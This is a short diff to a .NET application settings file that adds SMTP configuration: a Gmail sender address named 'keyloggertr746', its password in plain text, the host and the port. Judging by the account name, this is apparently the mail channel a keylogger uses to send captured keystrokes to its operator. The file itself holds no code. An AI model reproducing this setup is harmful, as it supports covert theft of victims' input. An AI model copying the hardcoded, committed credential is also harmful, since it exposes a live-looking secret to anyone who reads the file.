@@ -14,5 +14,17 @@
     <Setting Name="CurrentUserID" Type="System.Int32" Scope="User">
       <Value Profile="(Default)">-1</Value>
     </Setting>
+    <Setting Name="SmtpEmail" Type="System.String" Scope="User">
+      <Value Profile="(Default)">keyloggertr746@gmail.com</Value>
+    </Setting>
+    <Setting Name="SmtpPassword" Type="System.String" Scope="User">
+      <Value Profile="(Default)">enid kmsu ubbk lcqr</Value>
+    </Setting>
+    <Setting Name="SmtpHost" Type="System.String" Scope="User">
+      <Value Profile="(Default)">smtp.gmail.com</Value>
+    </Setting>
+    <Setting Name="SmtpPort" Type="System.String" Scope="User">
+      <Value Profile="(Default)">587</Value>
+    </Setting>
   </Settings>
 </SettingsFile>
